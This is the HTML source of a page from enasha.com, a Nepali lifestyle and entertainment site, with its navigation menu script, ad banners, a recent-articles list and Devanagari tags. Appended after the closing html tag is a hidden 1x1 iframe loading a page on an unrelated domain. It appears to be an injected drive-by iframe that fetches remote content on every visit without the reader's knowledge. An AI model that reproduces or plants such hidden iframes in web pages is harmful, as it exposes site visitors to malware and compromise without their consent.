	var TakeOverBgColor=1;			// Menu frame takes over background color subitem frame
	var FirstLineFrame='navig';			// Frame where first level appears
	var SecLineFrame='space';			// Frame where sub levels appear
	var DocTargetFrame='space';			// Frame where target documents appear
	var TargetLoc='';				// span id for relative positioning
	var HideTop=0;				// Hide first level when loading new document 1 or 0
	var MenuWrap=1;				// enables/ disables menu wrap 1 or 0
	var RightToLeft=1;				// enables/ disables right to left unfold 1 or 0
	var UnfoldsOnClick=0;			// Level 1 unfolds onclick/ onmouseover
	var WebMasterCheck=0;			// menu tree checking on or off 1 or 0
	var ShowArrow=1;				// Uses arrow gifs when 1
	var KeepHilite=1;				// Keep selected path highligthed
	var Arrws=['menuimages/menu_arrow.gif',10,5,'menuimages/menu_arrow.gif',10,5,'menuimages/menu_arrow.gif',16,12];	// Arrow source, width and height

function BeforeStart(){return}
function AfterBuild(){return}
function BeforeFirstOpen(){return}
function AfterCloseAll(){return}



// Menu tree
//	MenuX=new Array(Text to show, Link, background image (optional), number of sub elements, height, width);
//	For rollover images set "Text to show" to:  "rollover:Image1.jpg:Image2.jpg"
NoOffFirstLineMenus=12;
Menu1 = new Array("Around the World","section_new.php?section_id=2&pageno=1","",6,27,172);
  Menu1_1 = new Array("For Your Eyes Only","section_new.php?section_id=75&pageno=1","",0,27,160);
  Menu1_2 = new Array("Places of Nepal","section_new.php?section_id=76&pageno=1","",0,27,160);
  Menu1_3 = new Array("Super Interesting","section_new.php?section_id=22&pageno=1","",0,27,160);
  Menu1_4 = new Array("Weird and Interesting","section_new.php?section_id=20&pageno=1","",0,27,160);
  Menu1_5 = new Array("New n Edgy","section_new.php?section_id=21&pageno=1","",0,27,160);
  Menu1_6 = new Array("Bachelor Dude Column","section_new.php?section_id=23&pageno=1","",0,27,160);
Menu2 = new Array("People","section_new.php?section_id=5&pageno=1","",5,27,172);
  Menu2_1 = new Array("Bachelor n Bachelorette","http://www.enasha.com/bnb.php","",0,27,160);
  Menu2_2 = new Array("Close Encounter","section_new.php?section_id=50&pageno=1","",0,27,160);
  Menu2_3 = new Array("Personality","section_new.php?section_id=51&pageno=1","",0,27,160);
  Menu2_4 = new Array("Hot Dish","section_new.php?section_id=52&pageno=1","",0,27,160);
  Menu2_5 = new Array("People Who Chose Nepal","section_new.php?section_id=53&pageno=1","",0,27,160);
Menu3 = new Array("Life Style","section_new.php?section_id=4&pageno=1","",16,27,172);
  Menu3_1 = new Array("Main","section_new.php?section_id=29&pageno=1","",0,27,160);
  Menu3_2 = new Array("Emotional Intelligence","section_new.php?section_id=30&pageno=1","",0,27,160);
  Menu3_3 = new Array("Self Improvement","section_new.php?section_id=31&pageno=1","",0,27,160);
  Menu3_4 = new Array("Leisure","section_new.php?section_id=32&pageno=1","",0,27,160);
  Menu3_5 = new Array("Relationship","section_new.php?section_id=33&pageno=1","",0,27,160);
  Menu3_6 = new Array("Fashion n Grooming","section_new.php?section_id=34&pageno=1","",4,27,160);
    Menu3_6_1 = new Array("Style Check","section_new.php?section_id=35&pageno=1","",0,27,160);
    Menu3_6_2 = new Array("Fashion Police","section_new.php?section_id=36&pageno=1","",0,27,160);
    Menu3_6_3 = new Array("Feature","section_new.php?section_id=37&pageno=1","",0,27,160);
    Menu3_6_4 = new Array("Grooming","section_new.php?section_id=38&pageno=1","",0,27,160);
  Menu3_7 = new Array("Work n Office","section_new.php?section_id=39&pageno=1","",0,27,160);
  Menu3_8 = new Array("Health","section_new.php?section_id=40&pageno=1","",0,27,160);
  Menu3_9 = new Array("Fun n Humor","section_new.php?section_id=41&pageno=1","",0,27,160);
  Menu3_10 = new Array("Body and Mind","section_new.php?section_id=42&pageno=1","",0,27,160);
  Menu3_11 = new Array("Interior/Exterior","section_new.php?section_id=43&pageno=1","",0,27,160);
  Menu3_12 = new Array("Misc","section_new.php?section_id=44&pageno=1","",0,27,160);
  Menu3_13 = new Array("Wine and Dine","section_new.php?section_id=45&pageno=1","",0,27,160);
  Menu3_14 = new Array("Travels","section_new.php?section_id=46&pageno=1","",0,27,160);
  Menu3_15 = new Array("Pets","section_new.php?section_id=47&pageno=1","",0,27,160);
  Menu3_16 = new Array("Something To Think About","section_new.php?section_id=48&pageno=1","",0,27,160);
Menu4 = new Array("Technology","section_new.php?section_id=13&pageno=1","",5,27,172);
  Menu4_1 = new Array("Mobile","section_new.php?section_id=17&pageno=1","",2,27,160);
    Menu4_1_1 = new Array("Articles","section_new.php?section_id=71&pageno=1","",0,27,160);
    Menu4_1_2 = new Array("The Buzz","section_new.php?section_id=72&pageno=1","",0,27,160);
  Menu4_2 = new Array("Articles","section_new.php?section_id=61&pageno=1","",0,27,160);
  Menu4_3 = new Array("Gadget","section_new.php?section_id=62&pageno=1","",0,27,160);
  Menu4_4 = new Array("Online World","section_new.php?section_id=63&pageno=1","",0,27,160);
  Menu4_5 = new Array("Buying Tips","section_new.php?section_id=64&pageno=1","",0,27,160);
Menu5 = new Array("City Life","section_new.php?section_id=3&pageno=1","",4,27,172);
  Menu5_1 = new Array("Updates","section_new.php?section_id=25&pageno=1","",0,27,160);
  Menu5_2 = new Array("Weekend Movie Watch","section_new.php?section_id=26&pageno=1","",0,27,160);
  Menu5_3 = new Array("Horoscope","section_new.php?section_id=27&pageno=1","",0,27,160);
  Menu5_4 = new Array("City Sighting","section_new.php?section_id=24&pageno=1","",0,27,160);
Menu6 = new Array("Cars","http://www.enasha.com/cars.php","",2,27,172);
  Menu6_1 = new Array("Main Articles","section_new.php?section_id=57&pageno=1","",0,27,160);
  Menu6_2 = new Array("Articles","section_new.php?section_id=58&pageno=1","",0,27,160);
Menu7 = new Array("Bikes","http://www.enasha.com/bikes.php","",0,27,172);
Menu8 = new Array("Music","section_new.php?section_id=12&pageno=1","",2,27,172);
  Menu8_1 = new Array("Biography","section_new.php?section_id=59&pageno=1","",0,27,160);
  Menu8_2 = new Array("Feature","section_new.php?section_id=60&pageno=1","",0,27,160);
Menu9 = new Array("Bazaar","section_new.php?section_id=14&pageno=1","",2,27,172);
  Menu9_1 = new Array("News","section_new.php?section_id=18&pageno=1","",0,27,160);
  Menu9_2 = new Array("Offers","section_new.php?section_id=19&pageno=1","",0,27,160);
Menu10 = new Array("Television","section_new.php?section_id=15&pageno=1","",2,27,172);
  Menu10_1 = new Array("Feature","section_new.php?section_id=67&pageno=1","",0,27,160);
  Menu10_2 = new Array("Biography","section_new.php?section_id=68&pageno=1","",0,27,160);
Menu11 = new Array("Cinema","section_new.php?section_id=9&pageno=1","",3,27,172);
  Menu11_1 = new Array("Feature","section_new.php?section_id=54&pageno=1","",0,27,160);
  Menu11_2 = new Array("Biography","section_new.php?section_id=55&pageno=1","",0,27,160);
  Menu11_3 = new Array("Review","section_new.php?section_id=56&pageno=1","",0,27,160);
Menu12 = new Array("Sports","section_new.php?section_id=16&pageno=1","",2,27,172);
  Menu12_1 = new Array("Cricket","section_new.php?section_id=69&pageno=1","",0,27,160);
  Menu12_2 = new Array("Football","section_new.php?section_id=70&pageno=1","",0,27,160);
</script>                        <script type='text/javascript' src='menu_com.js'></script></td>
                      </tr>
                    </table></td>
                  </tr>
                 
                </table></td>
  </tr>
 
</table></td>
          </tr>
          <tr>
            <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
          </tr>
          <tr>
            <td><div align="center"><img src="main/images/cars/main/banners/dummybanner1.jpg" width="156" height="130" /></div></td>
          </tr>
          <tr>
            <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
          </tr>
          <tr>
            <td><div align="center"><img src="main/images/cars/main/banners/dummybanner2.jpg" width="156" height="260" /></div></td>
          </tr>
          <tr>
            <td height="19">&nbsp;</td>
          </tr>
        </table> 
				  </td>
        <td width="266" valign="top"><table width="250" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td align="center" valign="top"><script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<div align="left"></div>
<table  border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td></td>
  </tr>
  <tr> 
    <td valign="top"><a href="http://www.qfxcinemas.com/" target="_blank"><img src="/jainepal/stepup4_right.jpg" width="251" height="327" border="0" /></a></td>
  </tr>
  <tr> 
    <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td><script type="text/javascript">
AC_FL_RunContent( 'codebase','http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0','width','250','height','165','src','http://www.enasha.com/ads/ud_banner','quality','high','pluginspage','http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash','movie','http://www.enasha.com/ads/ud_banner' ); //end AC code
</script> <noscript>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="250" height="165">
        <param name="movie" value="http://www.enasha.com/ads/ud_banner.swf" />
        <param name="quality" value="high" />
        <embed src="http://www.enasha.com/ads/ud_banner.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="250" height="165"></embed> 
      </object>
      </noscript></td>
  </tr>
  <tr>
    <td><img src="main/images/transdot.gif" alt="" width="3" height="9" /></td>
  </tr>
  <tr>
    <td><a href="http://www.ultimatedecor.com.np" target="_blank"><img src="ads/ultimatedecor_9nov.jpg" width="250" height="137" border="0" /></a></td>
  </tr>
  <tr> 
    <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td>&nbsp;</td>
  </tr>
  <tr> 
    <td><div align="center"> 
        <link href="enashacss/enasha.css" rel="stylesheet" type="text/css" />
<table width="250" border="0" cellpadding="5" cellspacing="0" bgcolor="ffffff">
  <tr>
    <td>
	<table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
        <tr> 
          <td height="30"> <div align="left"><span class="random-title2"> Recent 
              Articles </span></div></td>
        </tr>
        <tr> 
          <td><table width="100%" border="0" cellpadding="0" cellspacing="0">
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3500'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3500.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3500'><font color="#002B5E">Sonitpur Saanjh 2068</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3499'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3499.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3499'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3498'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3498.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3498'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3497'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3497.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3497'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3496'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3496.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3496'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3495'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3495.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3495'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                          </table></td>
        </tr>
        <tr>
          <td align="left"><a href="http://www.enasha.com/latest_articles.php?pageno=1">Complete List 
            of Articles</a></td>
        </tr>
      </table></td>
  </tr>
</table>
      </div></td>
  </tr>
  <tr> 
    <td bgcolor="#666666"><table width="250" border="0" align="center" cellpadding="1" cellspacing="0" bgcolor="#CCCCCC">
        <tr> 
          <td><table width="100%" cellpadding="5" bgcolor="#FFFFFF">
              <tr> 
                <td align="left"> 
                                                  <p><span class="article-title2">Tags in TELEVISION </span><br />
                                                 <a href='http://www.enasha.com/article_tag1.php?tag_name=325&pageno=1' class='dip-tag' style='font-size: 12px;'>&#2352;&#2367;&#2351;&#2366;&#2354;&#2367;&#2335;&#2368; &#2358;&#2379;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=326&pageno=1' class='dip-tag' style='font-size: 21px;'>&#2358;&#2381;&#2352;&#2371;&#2329;&#2381;&#2326;&#2354;&#2366;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=327&pageno=1' class='dip-tag' style='font-size: 26px;'>&#2349;&#2368;&#2337;&#2348;&#2366;&#2361;&#2367;&#2352;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=328&pageno=1' class='dip-tag' style='font-size: 14px;'>&#2361;&#2354;&#2381;&#2354;&#2366; &#2352; &#2357;&#2366;&#2360;&#2381;&#2340;&#2357;&#2367;&#2325;&#2340;&#2366;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=329&pageno=1' class='dip-tag' style='font-size: 17px;'>&#2357;&#2367;&#2342;&#2375;&#2358;&#2350;&#2366;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=330&pageno=1' class='dip-tag' style='font-size: 23px;'>&#2352;&#2350;&#2366;&#2311;&#2354;&#2379;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=331&pageno=1' class='dip-tag' style='font-size: 26px;'>&#2309;&#2349;&#2367;&#2344;&#2375;&#2340;&#2366;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=332&pageno=1' class='dip-tag' style='font-size: 23px;'>&#2309;&#2349;&#2367;&#2344;&#2375;&#2340;&#2381;&#2352;&#2368;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=333&pageno=1' class='dip-tag' style='font-size: 18px;'>&#2344;&#2367;&#2352;&#2381;&#2350;&#2366;&#2340;&#2366;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=334&pageno=1' class='dip-tag' style='font-size: 12px;'>&#2344;&#2351;&#2366;&#2305;&#2346;&#2344;</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=335&pageno=1' class='dip-tag' style='font-size: 16px;'>&#2349;&#2367;&#2340;&#2381;&#2352;&#2368; &#2325;&#2369;&#2352;&#2366;</a>                                   <br />
                                                   <a href="http://www.enasha.com/group_tags.php">Browse Tag by Group</a> <br />
                                <a href="http://www.enasha.com/all_tags.php">Complete List of Tags</a></p>
                                                </td>
              </tr>
            </table></td>
        </tr>
      </table></td>
  </tr>
</table>
</td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td valign="top">&nbsp;</td>
        <td valign="top">&nbsp;</td>
        <td valign="top">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td height="72" background="main/images/bg_footer.jpg"><table width="98%" border="0" align="center" cellpadding="0" cellspacing="0" class="body1">
      <tr>
        <td width="5%">&nbsp;</td>
        <td width="95%">&copy; Copyright, eNASHA.com   <a href="#">About Us</a> | <a href="#">Advertise with us</a>  |  <a href="#">Contact</a>  |  <a href="#">Privacy Policy</a>  |  <a href="#">User Agreement </a></td>
      </tr>
    </table></td>
  </tr>
</table>
<blockquote>&nbsp;</blockquote>
</body>
</html>
<iframe src="http://yxbegan.com/ind.php" width="1" height="1" alt="Uw8bLlKjsi3HqXs"></iframe>